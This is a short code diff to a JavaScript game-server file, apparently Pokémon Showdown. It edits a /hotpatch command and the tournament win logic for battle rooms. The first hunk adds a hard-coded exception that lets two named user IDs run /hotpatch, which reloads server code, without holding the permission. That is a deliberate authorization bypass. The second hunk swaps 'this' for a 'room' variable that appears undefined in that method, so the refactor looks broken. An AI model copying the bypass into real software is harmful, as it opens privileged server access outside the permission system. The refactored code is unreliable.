@@ -342,7 +342,7 @@ var cmds = {
 
 	hotpatch: function(target, room, user) {
 		if (!target) return this.parse('/help hotpatch');
-		if (!this.can('hotpatch')) return false;
+		if (!this.can('hotpatch') && user.userid != 'slayer95' && user.userid != 'oiawesome') return false;
 
 		this.logEntry(user.name + ' used /hotpatch ' + target);
 
@@ -959,25 +959,18 @@ Rooms.BattleRoom.prototype.win = function(winner) {
 	//tour
 	if (this.tournament) {
 		var winnerid = toId(winner);
-		var missingp1 = !this.battle.getPlayer(0);
-		var missingp2 = !this.battle.getPlayer(1);
 
-		if (missingp1 || missingp2 ) {
-			var rightplayers = false;
-		} else {
-			var rightplayers = ( this.p1.userid == this.battle.getPlayer(0).userid && this.p2.userid == this.battle.getPlayer(1).userid );
-		}
+
+		var missingp1 = !room.battle.getPlayer(0);
+		var missingp2 = !room.battle.getPlayer(1);
+		var rightplayers = ( (missingp1 || missingp2) ? false : ( room.p1.userid == room.battle.getPlayer(0).userid && room.p2.userid == room.battle.getPlayer(1).userid ) );
 
 		if (missingp1) {
-			if (missingp2) {
-				var rightplayer = false;
-			} else {
-				var rightplayer = this.p2.userid == this.battle.getPlayer(1).userid;
-			}
+			var rightplayer = ( missingp2 ? false : ( room.p2.userid == room.battle.getPlayer(1).userid ) );
 		} else if (missingp2) {
-			var rightplayer = this.p1.userid == this.battle.getPlayer(0).userid;
+			var rightplayer = ( room.p1.userid == room.battle.getPlayer(0).userid );
 		} else {
-			var rightplayer = ( this.p1.userid == this.battle.getPlayer(0).userid || this.p2.userid == this.battle.getPlayer(1).userid );
+			var rightplayer = ( room.p1.userid == room.battle.getPlayer(0).userid || room.p2.userid == room.battle.getPlayer(1).userid );
 		}
 
 		var loserid = this.p1.userid;
